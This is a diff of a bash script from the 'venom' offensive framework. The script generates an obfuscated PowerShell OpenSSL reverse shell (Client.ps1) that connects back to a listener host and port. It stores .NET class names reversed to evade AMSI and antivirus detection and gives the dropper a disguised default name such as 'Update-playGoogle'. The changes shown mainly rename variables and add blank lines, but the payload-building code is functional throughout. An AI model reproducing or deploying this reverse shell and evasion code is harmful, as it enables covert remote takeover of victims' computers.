@@ -13673,8 +13673,8 @@ if [ -z "$lhost" ]; then lhost="$IP";fi
 if [ -z "$lport" ]; then lport="443";fi
 if [ -z "$CN" ]; then CN="SSARedTeam.com";fi
 if [ -z "$Drop" ]; then Drop="Update-playGoogle";fi
-if [ "$easter_egg" = "OFF" ]; then Ext="bat";else Ext="crdownload.bat";fi
-
+if [ "$easter_egg" = "OFF" ]; then Ext="bat";else Ext="bat";fi
+#Ext="crdownload.bat
 
 ## Display final settings to user.
 echo "${BlueF}[${YellowF}i${BlueF}]${white} AMSI MODULE SETTINGS"${Reset};sleep 1
@@ -13725,12 +13725,13 @@ cd $IPATH/output
 echo "${BlueF}[☠]${white} Writting OpenSSL reverse shell to output."${Reset};sleep 2
 echo "<#" > $IPATH/output/Client.ps1
 echo "Obfuscated Reverse OpenSSL Shell" >> $IPATH/output/Client.ps1
-echo "Framework: venom v1.0.17 (amsi evasion)" >> $IPATH/output/Client.ps1
+echo "Framework: venom v1.0.17 - shinigami" >> $IPATH/output/Client.ps1
 echo "#>" >> $IPATH/output/Client.ps1
 echo "" >> $IPATH/output/Client.ps1
-echo "\$Buffer = \"tneilCpcT.stekcoS.teN\";\$Cache = \$Buffer.ToCharArray();[Array]::Reverse(\$Cache);" >> $IPATH/output/Client.ps1
-echo "\$NewObjectCommand = (\$Cache -Join '');\$assembly = \"gnidocnEiicsA.txeT.metsyS\";\$CharArray = \$assembly.ToCharArray();" >> $IPATH/output/Client.ps1
+echo "\$Buff = \"tneilCpcT.stekcoS.teN\";\$Cac = \$Buff.ToCharArray();[Array]::Reverse(\$Cac);" >> $IPATH/output/Client.ps1
+echo "\$NewObjectCommand = (\$Cac -Join '');\$Micro = \"gnidocnEiicsA.txeT.metsyS\";\$CharArray = \$Micro.ToCharArray();" >> $IPATH/output/Client.ps1
 echo "[Array]::Reverse(\$CharArray);\$PSArgException = (\$CharArray -Join '');" >> $IPATH/output/Client.ps1
+echo "" >> $IPATH/output/Client.ps1
 echo "" >> $IPATH/output/Client.ps1
 echo "\$socket = New-Object \$NewObjectCommand('$lhost', $lport)" >> $IPATH/output/Client.ps1
 echo "\$stream = \$socket.GetStream()" >> $IPATH/output/Client.ps1
@@ -13740,6 +13741,7 @@ echo "        \$writer = new-object System.IO.StreamWriter(\$sslStream)" >> $IPA
 echo "        \$writer.Write((pwd).Path + '> ')" >> $IPATH/output/Client.ps1
 echo "        \$writer.flush()" >> $IPATH/output/Client.ps1
 echo "        [byte[]]\$bytes = 0..65535|%{0};" >> $IPATH/output/Client.ps1
+echo "" >> $IPATH/output/Client.ps1
 echo "" >> $IPATH/output/Client.ps1
 echo "while((\$i = \$sslStream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){" >> $IPATH/output/Client.ps1
 echo "   \$data = (New-Object -TypeName \$PSArgException).GetString(\$bytes,0, \$i);" >> $IPATH/output/Client.ps1
